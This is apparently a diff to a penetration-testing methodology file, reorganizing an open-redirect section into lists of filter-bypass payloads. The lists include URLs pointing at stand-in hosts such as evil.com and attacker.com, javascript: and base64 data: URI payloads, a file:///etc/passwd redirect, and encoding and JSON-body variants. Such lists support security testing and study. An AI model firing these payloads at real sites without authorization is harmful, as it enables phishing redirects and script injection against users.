@@ -193,7 +193,7 @@ Common examples of Business Logic Errors.
 ### Thread Comment Testing
 
 * Check if there's a limit to the number of comments on a thread.
-* If a user can only comment once, use race conditions to see if multiple comments can be posted.
+* If a user can only comment once, use race conditions to see if multiple comments can be posted.1
 * If the system allows comments by verified or privileged users, try to mimic these parameters and see if you can comment as well.
 * Attempt to post comments impersonating other users.
 
@@ -667,58 +667,101 @@ uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,v
 
 ### Approach:
 1. **### Bypassing Techniques:**
-   ```
-   example: any.com/payloads
-   any.com/bing.com
-   any.com//bing.com
-   any.com//bing.com/%2e%2e
-   //google.com
-   ////google.com
-   https:google.com
-   Using CRLF to bypass "javascript" blacklisted keyword: java%0d%0ascript%0d%0a:alert(0)
-   Using "//" and "////" to bypass "http" blacklisted keyword:  //google.com, ////google.com
-   Using "https:" to bypass "//" blacklisted keyword: https:google.com
-   Using "\/\/" to bypass "//" blacklisted keyword: \/\/google.com/, /\/google.com/
-   Using "%E3%80%82" to bypass "." blacklisted character: /?redir=google。com, //google%E3%80%82com
-   Using null byte "%00" to bypass blacklist filter:  //google%00.com
-   Using HTTP Parameter Pollution: ?next=whitelisted.com&next=google.com
-   Using "@" character. Common Internet Scheme Syntax: //<user>:<password>@<host>:<port>/<url-path> http://www.theirsite.com@yoursite.com/
-   Creating folder as their domain: http://www.yoursite.com/http://www.theirsite.com/, http://www.yoursite.com/folder/www.folder.com
-   Using "?" character, browser will translate it to "/?": http://www.yoursite.com?http://www.theirsite.com/, http://www.yoursite.com?folder/www.folder.com
-   Host/Split Unicode Normalization: https://evil.c℀.example.com . ---> https://evil.ca/c.example.com, http://a.com／X.b.com
-   ```
-   Use the payload to attempt a brute-force attack.
+   
+- **Using a whitelisted domain**: `https://www.whitelisted.com/evil.com` → redirects to `evil.com`
+- **Using // to bypass http**:  `//google.com`
+- **Using //// to bypass http**:  `////google.com`
+- **Using https: to bypass //**:  `https:google.com`
+- **Using \/\/ to bypass //**:  `\/\/google.com/` or `/\/google.com/`
+- **Using %E3%80%82 to bypass .**:  `//google%E3%80%82com` or `/?redir=google。com`
+- **Using null byte %00**:  `//google%00.com`
+- **Using CRLF to bypass javascript**:  `java%0d%0ascript%0d%0a:alert(0)`
+- **Using parameter pollution**:  `?next=whitelisted.com&next=google.com`
+- **Using @ character**:  `http://www.theirsite.com@yoursite.com/`
+- **Using folder as domain**:  `http://www.yoursite.com/http://www.theirsite.com/`, http://www.yoursite.com/folder/www.folder.com`
+- **Using ? character**:  `http://www.yoursite.com?http://www.theirsite.com/`,`http://www.yoursite.com?folder/www.folder.com`
+- **Using Unicode normalization**:  `https://evil.c℀.example.com` → interpreted as `https://evil.ca/c.example.com`,`http://a.com／X.b.com`
+- - **Basic external redirect**: ?next=https://google.com
+- **HTTP protocol injection**:  ?redirect=http://example.com
+- **HTTPS protocol injection**:  ?url=https://test.com
+- **Relative path redirect**:  ?redirect=/../external.com
+- **Double slash bypass**:  ?redirect=//evil.com
+- **URL-encoded redirect**:  ?redirect=%2F%2Fevil.com
+- **Double URL encoding bypass**:    ?redirect=%252F%252Fevil.com
+- **JavaScript protocol injection**:    ?redirect=javascript:alert(1)
+- **Data URI redirection**:  ?next=data:text/plain,redirect
+- **Open redirect via // in path**:   ?redirect=//attacker.com
+- **Open redirect via @ character**:  ?redirect=http://google.com@evil.com
+- **Open redirect via backslash**:  ?url=http:\evil.com
+- **Mixed encoding redirect**:    ?redirect=%2F%2Fevil.com%3Fnext%3Dtest
+- **Dot prefix redirect**:  ?redirect=.//attacker.com
+- **Subdomain bypass**:  ?redirect=https://legit.com.evil.com
+- **Null byte injection**:  ?url=https://legit.com%00.evil.com
+- **Trailing slash confusion**:  ?redirect=https://evil.com/./
+- **Query parameter injection**:  ?next=?redirect=https://evil.com
+- **Fragment identifier bypass**:  ?redirect=https://evil.com#test
+- **Redirect via JSON body**:  {"redirect":"https://evil.com"}
 
+2 ## 🔗 Protocol Injection Payloads
+- **HTTP injection**: ?redirect=http://evil.com 
+- **HTTPS injection**: ?url=https://evil.com 
+- **JavaScript injection**: ?redirect=javascript:alert(1) 
+- **Data URI injection**: ?next=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== 
+- **FTP injection**: ?redirect=ftp://evil.com/file 
+- **File protocol**: ?redirect=file:///etc/passwd 
+- **Mailto injection**: ?redirect=mailto:test@evil.com 
+- **Telnet injection**: ?redirect=telnet://evil.com 
+- **WS injection**: ?redirect=ws://evil.com/socket 
+- **WSS injection**: ?redirect=wss://evil.com/socket
+---
 
-- Using a whitelisted domain or keyword: `https://www.whitelisted.com/evil.com` redirects to `evil.com`
-- Using `//` to bypass `http` blacklisted keyword: `//google.com`
-- Using `https:` to bypass `//` blacklisted keyword: `https:google.com`
-- Using `%E3%80%82` to bypass `.` blacklisted character: `//google%E3%80%82com`
-- Using parameter pollution: `?next=whitelisted.com&next=google.com`
-- Using `@` character: `http://www.theirsite.com@yoursite.com/`
-
-```
-1. Basic External URL Redirect Test**:                   ?next=https://google.com`
-2. HTTP Protocol Injection Test**                        ?redirect=http://example.com`
-3. HTTPS Protocol Injection Test**                       ?url=https://test.com`
-4. Relative Path Redirect Test**                         ?redirect=/../external.com`
-5. Double Slash Bypass Test**                            ?redirect=//evil.com`
-6. URL-Encoded Redirect Test**                           ?redirect=%2F%2Fevil.com`
-7. Double URL Encoding Bypass Test**                     ?redirect=%252F%252Fevil.com`
-8. JavaScript Protocol Injection Test**                  ?redirect=javascript:alert(1)`
-9. Data URI Redirection Test**                           ?next=data:text/plain,redirect`
-10. Open Redirect via `//` in Path**                     ?redirect=//attacker.com`
-11. Open Redirect via `@` Character**                    ?redirect=http://google.com@evil.com`
-12. Open Redirect via `\` Backslash Escape**             ?url=http:\evil.com`
-13. Open Redirect with Mixed Encoding**                  ?redirect=%2F%2Fevil.com%3Fnext%3Dtest`
-14. Open Redirect via `.` Prefix**                       ?redirect=.//attacker.com`
-15. Open Redirect via Subdomain Bypass**                 ?redirect=https://legit.com.evil.com`
-16. Null Byte Injection Test**                           ?url=https://legit.com%00.evil.com`
-17. Trailing Slash Confusion Test**                      ?redirect=https://evil.com/./`
-18. Query Parameter Injection Test**                     ?next=?redirect=https://evil.com`
-19. Fragment Identifier Bypass Test**                    ?redirect=https://evil.com#test`
-20. Open Redirect via JSON Body**                         json  {"redirect":"https://evil.com"}
-```
+3 ## 🧩 Encoding Tricks
+- **URL encoded double slash**: ?redirect=%2F%2Fevil.com 
+- **Double URL encoding**: ?redirect=%252F%252Fevil.com 
+- **Unicode dot bypass**: ?redirect=//google%E3%80%82com 
+- **Null byte injection**: ?url=https://legit.com%00.evil.com 
+- **Mixed encoding**: ?redirect=%2F%2Fevil.com%3Fnext%3Dtest 
+- **CRLF injection**: ?redirect=java%0d%0ascript:alert(1) 
+- **Hex encoding**: ?redirect=%2e%2e%2fevil.com 
+- **Octal encoding**: ?redirect=%056evil.com 
+- **UTF-16 encoding**: ?redirect=%u002f%u002fevil.com 
+- **Overlong UTF-8 encoding**: ?redirect=%c0%af%c0%afevil.com
+---
+4 ## 📂 Path & Domain Tricks
+- **Relative path**: ?redirect=/../evil.com 
+- **Dot prefix**: ?redirect=.//evil.com 
+- **Folder as domain**: http://yoursite.com/http://evil.com 
+- **Trailing slash confusion**: ?redirect=https://evil.com/./ 
+- **Subdomain bypass**: ?redirect=https://legit.com.evil.com 
+- **Unicode normalization**: http://a.com／X.b.com 
+- **Double slash bypass**: ?redirect=////evil.com 
+- **Escaped slashes**: ?redirect=\/evil.com 
+- **Backslash escape**: ?url=http:\evil.com 
+- **Fragment bypass**: ?redirect=https://evil.com#test
+---
+5 ## ⚙️ Parameter Tricks
+- **Basic external redirect**: ?next=https://evil.com 
+- **Parameter pollution**: ?next=whitelisted.com&next=evil.com 
+- **Nested parameter**: ?next=?redirect=https://evil.com 
+- **Multiple query injection**: ?url=https://legit.com?redirect=https://evil.com 
+- **Encoded query**: ?redirect=https://evil.com%3Fparam%3Dtest 
+- **Parameter override**: ?redirect=https://legit.com&redirect=https://evil.com 
+- **Whitelist bypass**: ?redirect=https://legit.com.evil.com 
+- **Chained parameters**: ?next=https://legit.com?next=https://evil.com 
+- **Encoded ampersand**: ?redirect=https://evil.com%26param=test 
+- **Parameter splitting**: ?redirect=https://evil.com?param1=value1&param2=value2
+---
+6 ## 📦 JSON / Body Tricks
+- **JSON body redirect**: {"redirect":"https://evil.com"} 
+- **Nested JSON**: {"data":{"url":"https://evil.com"}} 
+- **Array JSON**: {"redirect":["https://legit.com","https://evil.com"]} 
+- **Base64 JSON**: {"redirect":"aHR0cHM6Ly9ldmlsLmNvbQ=="} 
+- **Escaped JSON**: {"redirect":"https:\/\/evil.com"} 
+- **Null JSON**: {"redirect":null,"next":"https://evil.com"} 
+- **Boolean JSON**: {"redirect":true,"url":"https://evil.com"} 
+- **Key confusion**: {"url":"https://legit.com","redirect":"https://evil.com"} 
+- **Nested object**: {"config":{"redirect":"https://evil.com"}} 
+- **Mixed encoding JSON**: {"redirect":"https:%2F%2Fevil.com"}
 # Directory Traversal
 
 * [Methodology](#methodology)
